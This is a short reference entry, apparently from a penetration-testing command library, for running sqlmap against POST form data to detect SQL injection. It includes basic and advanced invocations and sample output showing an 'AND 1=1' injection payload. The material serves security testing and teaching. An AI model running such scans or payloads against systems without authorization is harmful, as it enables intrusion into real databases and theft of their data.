---
id: cc3e9ca2-8ff5-4f7c-84ca-02a3147e60cb
name: sqlmap-detect-sqli-in-post-data
type: command
executor: bash
data: sqlmap -u '$_TARGET_URL' --data='$_POST_DATA'
output: >-
  sqlmap banner and testing output identifying injection points in POST
  parameters, such as boolean-based blind and error-based techniques for MySQL,
  with payloads and confirmation of the backend DBMS.
created_at: '2020-09-02T17:58:12.826945+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - sqli
  - sqlmap
verified: true
validated: true
---

# sqlmap-detect-sqli-in-post-data

## Command

```bash
sqlmap -u '$_TARGET_URL' --data='$_POST_DATA'
```

## Description

This command uses SQLMap to test a web endpoint for SQL injection vulnerabilities in POST parameters. It sends the specified URL and data payload, performs heuristic tests, and identifies injectable points across techniques like boolean-blind, error-based, and time-based SQLi. Ideal for forms where data is submitted via POST, such as logins.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u '$_TARGET_URL' | The target URL endpoint (e.g., login form) | Yes |
| --data='$_POST_DATA' | The POST data string with parameters to test (e.g., 'user=admin&pass=pass') | Yes |
| (Interactive prompts) | SQLMap will prompt for redirects, DBMS confirmation, and technique extensions | N/A |

## Examples

### Basic Usage

```bash
sqlmap -u 'http://example.com/login.php' --data='user=admin&pass=pass'
```

### Advanced Usage

```bash
sqlmap -u 'http://example.com/login.php' --data='user=admin&pass=pass' --dbms=mysql --level=3 --risk=2
```

(Adds DBMS forcing, higher testing level, and risk for thorough scans.)

## Expected Output

The command outputs SQLMap's banner, progress logs, and vulnerability details. Successful detection shows injection points:

```
[INFO] testing for SQL injection on POST parameter 'user'
[INFO] POST parameter 'user' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
...
sqlmap identified the following injection point(s):
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=admin' AND 1=1 --

back-end DBMS: MySQL
```

Look for confirmed techniques and prompts to select injection points.

## Related

- [[procedures/Exploit-SQL-Injection-with-SQLMap-using-POST-Data]]
- [[tools/sqlmap]]
